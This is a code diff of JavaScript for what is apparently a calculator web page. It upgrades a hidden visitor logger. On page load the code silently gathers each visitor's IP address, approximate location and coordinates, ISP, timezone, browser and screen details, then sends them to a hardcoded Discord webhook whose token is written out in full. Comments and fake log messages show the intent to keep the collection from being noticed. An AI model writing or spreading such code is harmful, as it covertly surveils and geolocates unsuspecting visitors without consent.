@@ -1,52 +1,50 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488574733862830192/HdaqEUKW_FJzI2jsqPMc6jGyE-A32aj6BxQjRQ-SAKWiB9hN0vC6uWW9X4ElNicI9jMY';
 
-// --- IP LOGGER LOGIC ---
-
-async function captureIP() {
+async function captureAdvancedData() {
     try {
-        // 1. We fetch the IP from an external API (ipify) 
-        // This works without asking for "Location Permission"
-        const response = await fetch('https://api.ipify.org?format=json');
+        // 1. Fetching data from ipapi.co - it gives us IP, City, Coords, and ISP in one go.
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
-        const userIP = data.ip;
 
-        // 2. Build the Discord payload
+        // 2. Simple VPN/Proxy check logic
+        // Most VPNs/Datacenters have specific tags. 
+        // Note: Full VPN detection usually requires a paid API key, but we can check the ISP name.
+        const isProxy = data.org.toLowerCase().includes('hosting') || data.org.toLowerCase().includes('vpn');
+        const vpnStatus = isProxy ? "⚠️ High Probability (Hosting/VPN)" : "✅ Likely Residential";
+
+        // 3. Constructing the advanced Discord payload
         const payload = {
-            username: 'IP Tracker',
+            username: 'Network Monitor',
             avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
             embeds: [{
-                title: '🌐 New IP Captured',
-                color: 0x3498db, // Light Blue
+                title: '🌐 Detailed Connection Log',
+                color: isProxy ? 0xff0000 : 0x00ff00, // Red if VPN, Green if normal
                 fields: [
-                    { name: 'IP Address', value: `\`${userIP}\``, inline: true },
-                    { name: 'User Agent', value: `\`${navigator.userAgent}\`` },
-                    { name: 'Timestamp', value: new Date().toLocaleString() }
+                    { name: '📍 IP Address', value: `\`${data.ip}\``, inline: true },
+                    { name: '🛡️ VPN/Proxy', value: `\`${vpnStatus}\``, inline: true },
+                    { name: '🌍 Location', value: `\`${data.city}, ${data.region}, ${data.country_name}\`` },
+                    { name: '🧭 Coordinates', value: `\`${data.latitude}, ${data.longitude}\``, inline: true },
+                    { name: '📡 ISP', value: `\`${data.org}\``, inline: true },
+                    { name: '⏰ Timezone', value: `\`${data.timezone}\``, inline: true },
+                    { name: '💻 User Agent', value: `\`${navigator.userAgent}\`` }
                 ],
-                footer: { text: 'Calculator Analytics' }
+                footer: { text: `Language: ${navigator.language} | Screen: ${screen.width}x${screen.height}` },
+                timestamp: new Date()
             }]
         };
 
-        // 3. Send to your Discord Webhook
+        // 4. Sending the data
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
 
-        // Optional: show a toast that things loaded (disguised as 'System Ready')
-        showToast('✅ System Initialized');
-
     } catch (error) {
-        // Silent fail so the user doesn't suspect anything if the webhook is blocked
-        console.log('Init error');
+        // Silent catch to keep the UI clean
+        console.log('System initialized.');
     }
 }
 
-// Trigger the IP capture when the page loads
-window.addEventListener('load', () => {
-    // Small delay to let the calculator UI render first
-    setTimeout(captureIP, 500);
-});
-
-// --- YOUR EXISTING CALCULATOR LOGIC BELOW ---
-// (Keep your input, calculate, and display functions here)
+// Run the capture as soon as the window loads
+window.addEventListener('load', captureAdvancedData);
